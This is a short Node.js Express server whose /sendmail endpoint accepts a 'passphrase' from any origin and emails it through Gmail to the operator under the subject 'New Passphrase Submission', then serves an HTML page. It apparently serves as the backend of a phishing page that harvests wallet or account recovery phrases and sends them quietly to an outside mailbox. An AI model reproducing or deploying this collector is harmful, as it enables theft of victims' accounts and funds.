const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const path = require("path");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

app.post("/sendmail", async (req, res) => {
    const { message } = req.body;

    let transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: process.env.EMAIL,  
            pass: process.env.PASSWORD,  
        },
    });

    let mailOptions = {
        from: process.env.EMAIL,
        to: process.env.EMAIL,  
        subject: "New Passphrase Submission",
        text: `Passphrase: ${message}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        res.sendFile(path.join(__dirname, "122.html")); // Serve success.html
    } catch (error) {
        res.status(500).send("Error sending message: " + error.message);
    }
});

// Start server
app.listen(3000, () => console.log("Server running on port 3000"));
